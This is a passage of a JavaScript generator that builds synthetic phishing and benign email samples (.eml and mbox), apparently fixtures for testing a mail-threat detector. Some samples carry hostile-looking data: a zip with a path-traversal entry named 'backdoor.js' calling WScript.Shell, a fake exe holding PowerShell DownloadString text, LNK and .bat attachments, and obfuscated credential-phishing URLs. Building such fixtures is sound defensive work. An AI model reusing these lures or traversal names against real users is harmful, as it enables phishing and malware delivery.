  const zip = zipWith([
    ['发票说明.txt', '请运行旁边的程序打开发票'],
    ['发票查看器.exe', 'MZ' + ' DownloadString powershell -enc fake payload '.repeat(20)],
    ['../../../../Windows/Temp/backdoor.js', 'WScript.Shell run cmd.exe']
  ])
  const headers = baseHeaders({
    from: '"发票服务" <fapiao@shop.example.org>',
    to: 'ap@corp.example.com',
    subject: ew('11月发票打包文件'),
    domain: 'evil.test',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <fapiao@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '附件为压缩包。\r\n' },
      {
        head: 'Content-Type: application/zip\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="invoices.zip"',
        body: zip.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('18-ZIP内嵌exe和路径穿越.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 19. LNK 快捷方式 + .bat */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"IT 运维" <ops@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: ew('域账号解锁工具'),
    domain: 'evil.test',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <ops@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '双击附件解锁账号。\r\n' },
      {
        head: 'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="账号解锁.lnk"',
        body: scriptFile('lnk').toString('base64').replace(/(.{76})/g, '$1\r\n')
      },
      {
        head: 'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="run.bat"',
        body: scriptFile('bat').toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('19-LNK快捷方式和bat.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 20. 正常多语种邮件(日文 Shift_JIS + 韩文 Euc-KR encoded-word) */
{
  const b = boundary()
  const subject = ew('契約更新のお知らせ', 'shift_jis', 'B') + ' / ' + ew('계약 갱신 안내', 'euc-kr', 'B')
  const headers = baseHeaders({
    from: ew('国際事業部', 'shift_jis', 'B') + ' <global@corp.example.com>',
    to: 'partner@corp.example.com',
    subject,
    domain: 'corp.example.com',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(corpHops), 'Return-Path: <global@corp.example.com>']
  })
  const fullBody = multipart(
    [
      {
        head: 'Content-Type: text/plain; charset="shift_jis"\r\nContent-Transfer-Encoding: base64',
        body: encodeText('来週の契約更新についてご確認ください。', 'shift_jis').toString('base64').replace(/(.{76})/g, '$1\r\n')
      },
      { head: 'Content-Type: text/html; charset=utf-8', body: '<p>来週の契約更新についてご確認ください。</p>' }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'corp.example.com', selector: 'selector1', key: keys.corp.privateKey, signTime: NOW })
  add('20-多语种日文韩文编码-正常.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 21. 正常带干净 PDF 附件的邮件(附件无威胁对照) */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"供应商" <vendor@shop.example.org>',
    to: 'buyer@corp.example.com',
    subject: ew('报价单 PDF'),
    domain: 'shop.example.org',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"',
      ...receivedChain([
        { from: 'smtp.shop.example.org', rdns: 'smtp.shop.example.org', ip: '192.0.2.50', by: 'edge.corp.example.com', proto: 'ESMTPS', id: 'SP1', date: new Date(NOW * 1000).toUTCString() }
      ]),
      'Return-Path: <vendor@shop.example.org>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '报价单见附件。\r\n' },
      {
        head: 'Content-Type: application/pdf; name="quote.pdf"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="quote.pdf"',
        body: pdfFile().toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'shop.example.org', selector: 's1', key: keys.shop.privateKey, signTime: NOW })
  add('21-正常干净PDF附件.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 22. 无宏的旧版 doc(低风险对照) */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"文档中心" <docs@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: ew('季度报告(旧格式)'),
    domain: 'corp.example.com',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(corpHops), 'Return-Path: <docs@corp.example.com>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '季度报告见附件。\r\n' },
      {
        head: 'Content-Type: application/msword\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="quarterly.doc"',
        body: olePlain().toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'corp.example.com', selector: 'selector1', key: keys.corp.privateKey, signTime: NOW })
  add('22-无宏旧版doc-低风险.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 23. 邮件群发工具头 + 钓鱼链接组合 */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"市场部" <mkt@corp.example.com>',
    to: 'list@corp.example.com',
    subject: ew('您有一个未读语音邮件'),
    domain: 'evil.test',
    extra: [
      'Content-Type: multipart/alternative; boundary="' + b + '"',
      ...receivedChain(evilHops),
      'Return-Path: <mkt@bulk-mailer.evil.test>',
      'X-Mailer: SwiftMailer 6.0',
      'List-Unsubscribe: <http://bulk-mailer.evil.test/unsub>'
    ]
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '语音邮件: http://phish-login.example.top/voicemail\r\n' },
      { head: 'Content-Type: text/html; charset=utf-8', body: '<a href="http://phish-login.example.top/voicemail?token=x">播放语音邮件</a>' }
    ],
    b
  )
  add('23-群发工具头-语音邮件钓鱼.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 24. 时间线异常:Received 时间倒流 */
{
  const weird = [
    { from: 'mta-a.evil.test', rdns: 'mta-a.evil.test', ip: '45.9.148.77', by: 'late.example.com', proto: 'ESMTP', id: 'T1', date: new Date((NOW + 3600) * 1000).toUTCString() },
    { from: 'late.example.com', rdns: 'late.example.com', ip: '10.1.1.1', by: 'edge.corp.example.com', proto: 'ESMTP', id: 'T2', date: new Date((NOW - 60) * 1000).toUTCString() }
  ]
  const headers = baseHeaders({
    from: '"时钟异常测试" <time@shop.example.org>',
    to: 'user@corp.example.com',
    subject: ew('投递时间线异常样本'),
    domain: 'shop.example.org',
    extra: ['Content-Type: text/plain; charset=utf-8', ...receivedChain(weird), 'Return-Path: <time@shop.example.org>']
  })
  add('24-Received时间倒流.eml', [...headers, '', '用于测试投递路径时间异常检测。\r\n'].join('\r\n'))
}

/* 25. 纯文本钓鱼 + IP 直连 URL + @ 混淆 + 非标端口 */
{
  const headers = baseHeaders({
    from: '"安全告警" <alert@bank.example.net>',
    to: 'user@corp.example.com',
    subject: ew('安全告警:异地登录'),
    domain: 'bank.example.net',
    extra: ['Content-Type: text/plain; charset=utf-8', ...receivedChain(evilHops), 'Return-Path: <alert@bulk-mailer.evil.test>']
  })
  const body =
    '检测到异地登录,请核实:\r\n' +
    'http://45.9.148.91:8443/auth\r\n' +
    'https://corp.example.com@phish-login.example.top/login\r\n' +
    'https://secure-bank.example.top:8080/?token=abc&redirect=http://x\r\n'
  add('25-IP直连和@混淆URL.eml', [...headers, '', body].join('\r\n'))
}

/* 26. QP 编码 + 嵌套 encoded-word 的附件名(再补一个编码压力样本) */
{
  const b = boundary()
  const subject = '=?utf-8?Q?=E8=B4=A6=E5=8D=95?= ' + ew(ew('嵌套两次的主题', 'utf-8', 'Q'), 'utf-8', 'B')
  const headers = baseHeaders({
    from: '"账单系统" <bill@corp.example.com>',
    to: 'user@corp.example.com',
    subject,
    domain: 'corp.example.com',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(corpHops), 'Return-Path: <bill@corp.example.com>']
  })
  const fname = rfc2231Filename('11月账单(明细).xlsx', 'utf-8')
  const xlsx = zipWith([['[Content_Types].xml', 'fake ooxml'], ['xl/workbook.xml', 'macroSettings fake']])
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable', body: qp(Buffer.from('账单明细见附件,请核对。', 'utf-8')) },
      {
        head: 'Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet;\r\n\t' + fname + '\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\t' + fname,
        body: xlsx.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'corp.example.com', selector: 'selector1', key: keys.corp.privateKey, signTime: NOW })
  add('26-QP嵌套编码附件名.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* ---------- 落盘 ---------- */
for (const s of samples) {
  writeFileSync(join(OUT, s.file), s.content)
}

/* mbox 批次:每封加 From 封套(纯 Buffer 拼接,避免 latin1→UTF-8 双重编码) */
function toMbox(list, file) {
  const chunks = []
  for (const s of list) {
    const sender = /From: .*?<([^>]+)>/.exec(s.content.toString('binary'))?.[1] || 'unknown@local'
    const envelope = Buffer.from(`From ${sender} ${new Date(NOW * 1000).toUTCString().replace(/,\s*/, ' ')}\r\n`, 'ascii')
    // 正文统一 CRLF:先按字节归一,再追加结尾 CRLF
    const normalized = Buffer.from(s.content.toString('binary').replace(/\r?\n/g, '\r\n') + '\r\n', 'binary')
    chunks.push(envelope, normalized)
  }
  writeFileSync(join(BATCH, file), Buffer.concat(chunks))
}
toMbox(samples.slice(0, 8), '钓鱼样本批次A-前8封.mbox')
toMbox(samples.slice(8, 18), '钓鱼样本批次B-10封.mbox')

const manifest = {
  generatedAt: new Date(NOW * 1000).toISOString(),
  count: samples.length,
  files: samples.map((s) => s.file),
  mbox: readdirSync(BATCH),
  dkimKeys: 'dkim-keys.json'
}
writeFileSync(join(OUT, 'manifest.json'), JSON.stringify(manifest, null, 2))
console.log(`已生成 ${samples.length} 封 eml + ${manifest.mbox.length} 个 mbox,公钥写入 dkim-keys.json`)
console.log('目录:', OUT)
